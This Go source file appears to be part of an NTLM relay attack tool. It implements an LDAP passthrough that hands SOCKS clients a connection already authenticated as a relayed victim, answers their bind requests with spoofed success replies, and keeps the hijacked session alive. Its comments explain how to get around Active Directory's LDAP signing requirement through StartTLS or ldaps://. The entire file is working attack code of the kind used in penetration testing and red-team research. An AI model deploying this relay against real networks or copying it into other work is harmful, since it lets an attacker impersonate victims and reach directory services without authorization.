// MIT License
//
// Copyright (c) 2026 Jimmy Fjällid
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

package relay

import (
	"context"
	"errors"
	"fmt"
	"net"
	"time"

	ber "github.com/go-asn1-ber/asn1-ber"
	"github.com/jfjallid/go-smb/smb/server"
)

// upstreamReadTimeout bounds how long a single forwarded LDAP request waits
// for the upstream to respond. With NTLM relay onto plain LDAP, AD with its
// default "Require signing" policy silently discards every post-bind message
// because the relay can't sign without the inbound's session keys. The
// pinned socket appears alive at the TCP layer but produces no response — so
// without a deadline we'd hang forever. 30s is generous enough for slow
// searches and short enough to fail fast on the signing-required drop.
//
// The ldap:// path defaults to a StartTLS upgrade (see ldapForwarder.dialUpstream)
// which sidesteps this drop entirely — AD treats TLS-wrapped channels as
// equivalent to signed, so post-bind messages flow normally. The 30s bound
// remains in place for the residual fallback case where StartTLS was either
// disabled or rejected by the upstream.
var upstreamReadTimeout = 30 * time.Second

// LDAP application tags used by the passthrough's state machine. Continuation
// tags (SearchResultEntry, SearchResultReference, IntermediateResponse) mean
// "more responses follow for this messageID"; everything else terminates the
// per-request exchange.
const (
	ldapAppUnbindRequest         ber.Tag = 2
	ldapAppSearchResEntry        ber.Tag = 4
	ldapAppSearchResRef          ber.Tag = 19
	ldapAppIntermediateResponse  ber.Tag = 25
)

// LDAPPassthrough bridges a SOCKS-side LDAP client onto a pre-bound upstream
// LDAP connection. BindRequests from the client are answered with a synthetic
// success response (the upstream is already bound as the relayed victim and
// can only be bound once); UnbindRequest is dropped (forwarding it would tear
// down the pinned upstream). Every other LDAP operation is forwarded
// verbatim, with MessageID translation between the local and upstream
// counters.
//
// The passthrough holds Upstream.mu for the lifetime of the conversation so
// concurrent SOCKS clients aiming at the same upstream serialize cleanly.
type LDAPPassthrough struct {
	Local    net.Conn
	Target   string // upstream "host:port"
	Upstream *pooledSession
	Resolve  func(target string) *pooledSession
	Logger   server.Logger
}

// Run drives the local conversation until Local closes (clean EOF), the
// client sends UnbindRequest, or the upstream errors.
func (p *LDAPPassthrough) Run(ctx context.Context) error {
	if p.Logger == nil {
		p.Logger = log
	}
	if p.Upstream == nil && p.Resolve != nil {
		p.Upstream = p.Resolve(p.Target)
	}
	if p.Upstream == nil || p.Upstream.LDAP == nil {
		return fmt.Errorf("no pooled LDAP session for %s", p.Target)
	}
	up := p.Upstream.LDAP
	p.Logger.Debugf("starting for target=%s", p.Target)

	// Single-conversation serialization. Holding the pool entry's mu prevents
	// two SOCKS clients from interleaving on the same upstream.
	p.Upstream.mu.Lock()
	defer p.Upstream.mu.Unlock()
	p.Logger.Debugf("locked pool entry, awaiting local LDAP request")

	for {
		req, err := ber.ReadPacket(p.Local)
		if err != nil {
			p.Logger.Debugf("local read returned err=%v — closing", err)
			return nil
		}
		localID, opTag, err := parseLDAPMessage(req)
		if err != nil {
			p.Logger.Debugf("parse local message: %v", err)
			return fmt.Errorf("parse local message: %w", err)
		}
		p.Logger.Debugf("local id=%d opTag=%d", localID, opTag)

		switch opTag {
		case ber.Tag(ldapAppBindRequest):
			if err := p.spoofBindSuccess(localID); err != nil {
				p.Logger.Debugf("spoof write err=%v", err)
				return fmt.Errorf("spoof BindResponse: %w", err)
			}
			p.Logger.Debugf("spoofed BindResponse id=%d", localID)
			continue
		case ber.Tag(ldapAppUnbindRequest):
			p.Logger.Debugf("local Unbind — closing tunnel, upstream stays")
			return nil
		}

		upstreamID := up.allocMessageID()
		if err := rewriteMessageID(req, upstreamID); err != nil {
			return fmt.Errorf("rewrite messageID: %w", err)
		}
		if _, err := up.conn.Write(req.Bytes()); err != nil {
			p.Logger.Debugf("upstream write err=%v — marking dead", err)
			p.Upstream.MarkDead()
			return fmt.Errorf("write to upstream: %w", err)
		}
		p.Logger.Debugf("forwarded local id=%d as upstream id=%d", localID, upstreamID)

		for {
			if err := up.conn.SetReadDeadline(time.Now().Add(upstreamReadTimeout)); err != nil {
				p.Logger.Debugf("SetReadDeadline err=%v", err)
			}
			resp, err := ber.ReadPacket(up.conn)
			// Clear the deadline so the bind path / next iteration starts
			// fresh — and so a stale deadline can't poison later use.
			_ = up.conn.SetReadDeadline(time.Time{})
			if err != nil {
				p.Upstream.MarkDead()
				if isTimeout(err) {
					p.Logger.Debugf("upstream silent for %s — likely LDAP signing required (plain ldap:// + NTLM); use ldaps://", upstreamReadTimeout)
					return fmt.Errorf("upstream LDAP did not respond within %s — DC likely requires LDAP signing on plain ldap:// (NTLM relay cannot sign without the victim's session keys); switch the target to ldaps://", upstreamReadTimeout)
				}
				p.Logger.Debugf("upstream read err=%v — marking dead", err)
				return fmt.Errorf("read upstream response: %w", err)
			}
			_, respTag, perr := parseLDAPMessage(resp)
			if perr != nil {
				return fmt.Errorf("parse upstream response: %w", perr)
			}
			if err := rewriteMessageID(resp, localID); err != nil {
				return fmt.Errorf("rewrite response messageID: %w", err)
			}
			if _, err := p.Local.Write(resp.Bytes()); err != nil {
				p.Logger.Debugf("local write err=%v — closing", err)
				return nil
			}
			p.Logger.Debugf("relayed upstream response opTag=%d to local id=%d", respTag, localID)
			if !isLDAPContinuation(respTag) {
				break
			}
		}
		p.Upstream.Touch()
	}
}

// parseLDAPMessage extracts (messageID, protocolOpTag) from an LDAPMessage
// envelope. Returns an error if the envelope is malformed.
func parseLDAPMessage(env *ber.Packet) (int64, ber.Tag, error) {
	if env == nil || len(env.Children) < 2 {
		return 0, 0, fmt.Errorf("not a SEQUENCE of two children")
	}
	idChild := env.Children[0]
	id, ok := idChild.Value.(int64)
	if !ok {
		return 0, 0, fmt.Errorf("messageID: unexpected type %T", idChild.Value)
	}
	op := env.Children[1]
	if op.ClassType != ber.ClassApplication {
		return 0, 0, fmt.Errorf("protocolOp not application class (got %d)", op.ClassType)
	}
	return id, op.Tag, nil
}

// rewriteMessageID replaces the MessageID child (Children[0]) with a fresh
// INTEGER packet carrying newID. Both the Value and the encoded Data of the
// envelope are kept in sync so the subsequent Bytes() emit the new ID on the
// wire.
func rewriteMessageID(env *ber.Packet, newID int64) error {
	if env == nil || len(env.Children) < 2 {
		return fmt.Errorf("envelope has no MessageID child")
	}
	newIDPkt := ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, newID, "MessageID")
	// Rebuild Children[0] in-place and force re-serialization of the envelope
	// by clearing its Data and re-appending all children.
	env.Children[0] = newIDPkt
	rebuildSequenceData(env)
	return nil
}

// rebuildSequenceData regenerates env.Data from env.Children so a subsequent
// Bytes() call emits the current child set. Required after Children mutation
// because the BER library serializes by concatenating Data + child bytes from
// a buffer it never refreshes on its own.
func rebuildSequenceData(env *ber.Packet) {
	env.Data.Reset()
	for _, c := range env.Children {
		env.Data.Write(c.Bytes())
	}
}

// isLDAPContinuation reports whether a response with this tag is part of a
// multi-message response stream (more responses follow for the same
// messageID).
func isLDAPContinuation(tag ber.Tag) bool {
	return tag == ldapAppSearchResEntry || tag == ldapAppSearchResRef || tag == ldapAppIntermediateResponse
}

// isTimeout reports whether err originated from a Set*Deadline expiring.
// net.Conn read/write errors of that origin satisfy net.Error.Timeout().
func isTimeout(err error) bool {
	var ne net.Error
	return errors.As(err, &ne) && ne.Timeout()
}

// spoofBindSuccess synthesizes and writes a BindResponse{resultCode=success}
// to the local conn carrying the same MessageID the client used for its
// BindRequest. The upstream socket is left untouched — it's already bound as
// the relayed victim.
func (p *LDAPPassthrough) spoofBindSuccess(localID int64) error {
	env := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAPMessage")
	env.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, localID, "MessageID"))
	resp := ber.Encode(ber.ClassApplication, ber.TypeConstructed, ber.Tag(ldapAppBindResponse), nil, "BindResponse")
	resp.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, int64(ldapResultSuccess), "resultCode"))
	resp.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "matchedDN"))
	resp.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "diagnosticMessage"))
	env.AppendChild(resp)
	_, err := p.Local.Write(env.Bytes())
	return err
}
